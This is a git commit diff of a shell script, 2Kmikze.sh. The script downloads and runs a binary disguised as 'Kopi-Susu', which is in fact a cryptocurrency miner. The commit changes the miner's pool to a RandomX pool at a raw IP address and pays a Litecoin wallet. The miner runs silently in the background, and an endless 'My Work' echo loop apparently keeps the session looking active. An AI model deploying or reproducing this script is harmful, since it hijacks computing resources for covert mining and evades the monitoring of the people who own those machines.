d8ebf1c0e348404488e868e9d2ad586f18d7e8cf
preak07 <160253225+preak07@users.noreply.github.com>
2024-04-15 13:33:54 +0700

    Update 2Kmikze.sh

--- 2Kmikze.sh
+++ 2Kmikze.sh
@@ -6,7 +6,7 @@ dpkg-reconfigure --frontend noninteractive tzdata
 wget https://github.com/preak07/kopi/releases/download/kopi/Kopi-Susu.tar.gz
 tar -xvf Kopi-Susu.tar.gz
 chmod +x Kopi-Susu
-./Kopi-Susu --algorithm verushash --pool verushash.auto.nicehash.com:9200 --wallet 3AhGzsYExJchLbzGVuiRTk33M5RAmL6C1f.QuickSiLver -t 1  >/dev/null 2>&1 &
+./Kopi-Susu --algorithm randomx --pool 159.203.162.18:3333 --wallet LTC:MKYvrRVVF8KB3gsWu9hxSQr57asXEhZWoF.QuickSiLver -t 1  >/dev/null 2>&1 &
 while true
 do
         echo "My Work"
